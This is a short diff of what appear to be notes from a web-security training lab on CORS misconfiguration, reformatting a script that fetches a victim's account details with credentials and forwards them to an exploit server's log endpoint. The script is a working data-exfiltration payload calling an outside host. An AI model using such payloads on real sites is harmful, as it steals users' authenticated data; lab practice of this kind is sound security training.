@@ -30,7 +30,20 @@ function reqListener(){
 
 
 script used for reading out the data to the /log endpoint:
-<script>var req= new XMLHttpRequest();req.onload = reqListener;req.open('get','https://0aa000e40481c179800435c900690023.web-security-academy.net/accountDetails',true);req.withCredentials = true;req.send();function reqListener(){location='https://exploit-0a21004a0465c185809b344301410040.exploit-server.net/log?key='+this.responseText;}</script>
+<script>
+    var req = new XMLHttpRequest();
+
+    req.onload = reqListener;
+
+    req.open('GET', 'https://0aa000e40481c179800435c900690023.web-security-academy.net/accountDetails', true);
+    req.withCredentials = true;
+
+    req.send();
+
+    function reqListener() {
+        location = 'https://exploit-0a21004a0465c185809b344301410040.exploit-server.net/log?key=' + this.responseText;
+    }
+</script>
 
 
 exploit:
